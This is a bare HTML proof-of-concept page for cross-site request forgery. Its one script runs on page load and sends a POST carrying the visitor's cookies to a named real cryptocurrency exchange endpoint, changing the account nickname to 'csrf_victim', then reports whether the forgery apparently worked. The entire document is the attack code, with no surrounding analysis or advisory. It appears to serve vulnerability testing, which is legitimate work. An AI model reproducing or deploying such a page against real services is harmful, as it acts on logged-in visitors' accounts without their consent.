<!DOCTYPE html>
<html>
  <body>
    <script>
      fetch("https://www.okx.com/v3/users/im/basic/petname", {
        method: "POST",
        credentials: "include", // sends cookies
        headers: {
          "Content-Type": "application/x-www-form-urlencoded"
        },
        body: "petname=csrf_victim"
      }).then(res => {
        console.log("Response:", res.status);
        if (res.ok) {
          alert("CSRF may have worked!");
        } else {
          alert("Blocked by browser or server.");
        }
      }).catch(err => {
        console.error("Request failed:", err);
      });
    </script>
  </body>
</html>
